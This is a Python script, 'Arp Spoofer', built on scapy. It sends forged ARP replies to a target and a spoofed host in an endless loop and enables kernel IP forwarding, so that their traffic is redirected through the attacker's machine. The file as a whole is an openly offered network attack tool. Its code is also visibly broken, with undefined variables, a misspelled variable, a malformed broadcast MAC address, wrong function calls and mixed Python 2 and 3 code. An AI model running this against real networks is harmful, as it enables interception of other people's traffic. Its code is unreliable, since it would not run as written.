#!/usr/bin/python
############################################################
# Requirements:
# pip install scapy
# 
############################################################
from scapy.all import *
import threading
import argparse
import os
import datetime
import binascii
from termcolor import colored
import os
import ipaddress
import threading
import time


name = 'Arp Spoofer'
version = '0.8'
date = '12/04/2020'
ip_forward = '/proc/sys/net/ipv4/ip_forward'

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-no_routing', required=False, action='store_true', help='[Optional] Disable automatic kernel routing enabler.')
    parser.add_argument('-i', required=True, action='store', dest='interface',help='Interface to use on DHCP attacks.')
    parser.add_argument('-t', required=True, action='store', dest='target_address', help='Target Address or Network')
    parser.add_argument('-s', required=True, action='store', dest='spoof_address', help='Spoofed Address or Network')
    args = parser.parse_args()

def setup():
    # To stop scapy from checking return packet originating from any packet that we have sent out
    conf.checkIPaddr=False
    # Disable default scapy output
    conf.verb = 0
    if args.no_routing:
        print ('###[  Ignore Kernel Routing disabled ]###')
        print ('')
    else:
        print ('###[  Enable Kernel Routing enabling ]###')
        print ('###[  echo 1 > /proc/sys/net/ipv4/ip_forward ]###')
        enable_packet_forwarding()
        print ('')

def print_banner(name,version,date):
    print ('###[ ' + name + ']###')
    print ('###[ Version ' + verion + ' ]###')
    print ('###[ Date ' + date + ' ]###')
    print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
    print ('')

def ip_list(address_or_ip):
    vector = []
    if not "/" in str(address_or_ip):
        return vector.append(address_or_ip)
    else:
        for i in (ipaddress.ip_network(unicode(address_or_ip), False)):
            if i != temp.broadcast_address:
                if i != temp.network_address:
                    vector.append(i)   
        return vector

def enable_packet_forwarding():
    with open(ip_forward, 'w') as fd:
        fd.write('1')

def disable_packet_forwarding():
    with open(ip_forward, 'w') as fd:
        fd.write('0')

def log_timestamp():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def mac_to_hex(mac):
    if '3.' in platform.python_version():
        return binascii.unhexlify(mac.replace(':',''))
    else:
        return mac.replace(':', '').decode('hex')

def get_mac_fom_ip(ip):
    resp, unans = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:f', pdst=ip), retry=2, timeout=1)
    if (resp != None):
        for s,r in resp:
            return r[ARP].hwsrc
    else:
        return None
    
def attack_matrix(s,t):
    r_matrix = []
    for i in ip_list(s):
        i_mac = get_mac_fom_ip(i)
        if i_mac != None:
            for j in ip_list(t):
                j_mac = get_mac_fom_ip(j)
                if j_mac != None:
                    r_matrix.append(i,mac_i,j,mac_j)
    return r_matrix

def arp_poison(ip_a, mac_a, ip_b, mac_b):
    while True:
        pkt = ARP(op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b)
        send(pkt)
        print ('###[ ' + log_timestamp() + ' Forged ARP Replay for : ' + colored(ip_a,'red') + ' : ' + colored(ip_b,'blue') + ' is at ' + colored(localmac,'blue') + ' ]###')
        #print pkt.summary()
        #print pkt.display()        
        pkt = ARP(op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a)
        send(pkt)    
        print ('###[ ' + log_timestamp() + ' Forged ARP Replay for : ' + colored(ip_b,'red') + ' : ' + colored(ip_a,'blue') + ' is at ' + colored(localmac,'blue') + ' ]###')
        #print pkt.summary()
           #print pkt.display()                
        print ('')
        time.sleep(2)

print_banner()
parse_arguments()
setup()
localiface = args.interface
localmac = get_if_hwaddr(localiface)

print (attack_matrix(target_address,spoof_address))

mac_target = get_mac_fom_ip(ip_target)
mac_spoof = get_mac_fom_ip(ip_spoof)
try:
    arp_poison(ip_spoof, mac_spoof, ip_target, mac_target)
except KeyboardInterrupt:
    pass
if not args.no_routing:
    disable_packet_forwarding()
